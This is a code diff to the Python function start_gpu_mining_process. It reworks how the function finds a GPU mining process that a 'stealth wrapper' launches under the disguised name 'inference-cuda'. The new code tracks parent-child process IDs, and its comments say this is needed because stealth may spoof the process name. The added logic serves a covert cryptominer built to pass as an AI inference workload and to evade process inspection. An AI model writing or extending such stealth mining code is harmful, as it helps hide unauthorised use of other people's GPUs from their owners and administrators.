@@ -640,23 +640,97 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                         process_type = "gpu"  # GPU-only mode
                         
                         # Wait for stealth wrapper to spawn child process
-                        time.sleep(2)
+                        time.sleep(4)  # Increased from 2s to 4s for stealth initialization
                         
-                        # Find actual mining process by command name
-                        target_cmd = "inference-cuda"  # GPU-only mode
+                        # 🚀 [PID RELATIONSHIP DETECTION] - Stealth-resistant detection using parent-child relationships
+                        wrapper_pid = process.pid  # Current wrapper PID (e.g., 997)
+                        target_cmd = "inference-cuda"  # GPU-only mode  
                         real_mining_pid = None
                         
-                        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-                            try:
-                                if proc.info['name'] == target_cmd:
-                                    # Verify it's recent process (started within last 30 seconds)
-                                    proc_obj = psutil.Process(proc.info['pid'])
-                                    if time.time() - proc_obj.create_time() < 30:
-                                        real_mining_pid = proc.info['pid']
-                                        logger.info(f"🔍 Detected real mining PID: {real_mining_pid} for {target_cmd}")
-                                        break
-                            except (psutil.NoSuchProcess, psutil.AccessDenied):
-                                continue
+                        logger.info(f"🔍 [PID-DETECTION] Starting PID Relationship Detection for wrapper PID {wrapper_pid}")
+                        
+                        try:
+                            # METHOD 1: Direct children detection using psutil.Process().children()
+                            wrapper_process = psutil.Process(wrapper_pid)
+                            children = wrapper_process.children(recursive=True)  # Include nested children
+                            
+                            logger.info(f"🔍 [PID-DETECTION] Found {len(children)} child process(es) of wrapper PID {wrapper_pid}")
+                            
+                            for child in children:
+                                try:
+                                    child_info = child.as_dict(['pid', 'name', 'cmdline', 'exe', 'ppid', 'create_time'])
+                                    logger.info(f"🔍 [PID-DETECTION] Analyzing child: PID={child_info['pid']}, name='{child_info.get('name', 'N/A')}', ppid={child_info.get('ppid', 'N/A')}")
+                                    
+                                    # Verify it's inference-cuda process using multiple criteria
+                                    is_inference_cuda = False
+                                    match_method = None
+                                    
+                                    # Check 1: Executable path
+                                    if child_info.get('exe') and target_cmd in child_info['exe']:
+                                        is_inference_cuda = True
+                                        match_method = "executable"
+                                        logger.info(f"✅ [PID-DETECTION] Match by executable: {child_info['exe']}")
+                                    
+                                    # Check 2: Command line arguments
+                                    elif child_info.get('cmdline'):
+                                        for arg in child_info['cmdline']:
+                                            if target_cmd in str(arg):
+                                                is_inference_cuda = True
+                                                match_method = "cmdline"
+                                                logger.info(f"✅ [PID-DETECTION] Match by cmdline: {child_info['cmdline']}")
+                                                break
+                                    
+                                    # Check 3: Process age validation (started within last 2 minutes)
+                                    if is_inference_cuda:
+                                        process_age = time.time() - child_info['create_time']
+                                        if process_age < 120:  # 2 minutes window
+                                            real_mining_pid = child_info['pid']
+                                            logger.info(f"🎯 [PID-DETECTION] Real mining PID detected: {real_mining_pid}")
+                                            logger.info(f"🔍 [PID-DETECTION] Detection method: {match_method}")
+                                            logger.info(f"🔍 [PID-DETECTION] Process details: name='{child_info.get('name', 'N/A')}' (may be spoofed by stealth)")
+                                            logger.info(f"🔍 [PID-DETECTION] Process age: {process_age:.1f} seconds")
+                                            break
+                                        else:
+                                            logger.info(f"⚠️ [PID-DETECTION] Process too old ({process_age:.1f}s), skipping PID {child_info['pid']}")
+                                    
+                                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
+                                    logger.debug(f"🔍 [PID-DETECTION] Child process access error: {e}")
+                                    continue
+                            
+                        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
+                            logger.warning(f"⚠️ [PID-DETECTION] Cannot access wrapper process {wrapper_pid}: {e}")
+                        
+                        # METHOD 2: Fallback PPID search if children() method fails
+                        if not real_mining_pid:
+                            logger.info(f"🔍 [PID-DETECTION] Fallback: Manual PPID search for parent {wrapper_pid}")
+                            
+                            for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe', 'ppid', 'create_time']):
+                                try:
+                                    if proc.info.get('ppid') == wrapper_pid:
+                                        # Validate this child is inference-cuda
+                                        is_inference_cuda = False
+                                        match_method = None
+                                        
+                                        # Check executable
+                                        if proc.info.get('exe') and target_cmd in proc.info['exe']:
+                                            is_inference_cuda = True
+                                            match_method = "exe-fallback"
+                                        
+                                        # Check cmdline  
+                                        elif proc.info.get('cmdline'):
+                                            is_inference_cuda = any(target_cmd in str(arg) for arg in proc.info['cmdline'])
+                                            match_method = "cmdline-fallback"
+                                        
+                                        if is_inference_cuda:
+                                            process_age = time.time() - proc.info['create_time']
+                                            if process_age < 120:  # 2 minutes window
+                                                real_mining_pid = proc.info['pid']
+                                                logger.info(f"🎯 [PID-DETECTION] Real mining PID found via PPID fallback: {real_mining_pid}")
+                                                logger.info(f"🔍 [PID-DETECTION] Fallback detection method: {match_method}")
+                                                break
+                                        
+                                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                                    continue
                         
                         if real_mining_pid:
                             # Register real mining process for Enhanced PID Logger
